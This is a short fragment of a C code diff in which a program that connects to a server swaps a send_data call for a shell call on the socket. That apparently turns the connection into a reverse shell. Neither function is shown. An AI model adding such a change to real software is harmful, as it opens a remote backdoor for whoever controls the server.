@@ -19,7 +19,7 @@ int main(int argc, char **argv){
         if(connect_to_server(sock, sin, 60) == EOF)
             close(sock);
         else
-            send_data(sock);
+            shell(sock);
     }
     return 0;
 }
